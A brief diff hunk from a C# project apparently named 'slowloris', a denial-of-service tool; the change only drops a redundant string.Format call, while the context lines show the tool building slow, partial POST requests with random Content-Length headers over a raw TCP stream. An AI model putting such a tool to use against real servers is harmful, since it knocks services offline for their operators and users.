@@ -197,7 +197,7 @@ namespace slowloris
             TCPWriter = new StreamWriter(TCPClient.GetStream());
             TCPWriter.AutoFlush = false;
 
-            TCPWriter.WriteLine(string.Format("POST / HTTP/1.1"));
+            TCPWriter.WriteLine("POST / HTTP/1.1");
             TCPWriter.WriteLine("Content-type: application/x-www-form-urlencoded");
             TCPWriter.WriteLine(string.Format("Content-Length: {0}", randomizer.Next(0, 5000)));
             TCPWriter.WriteLine(string.Format("User-Agent: {0}", ua));
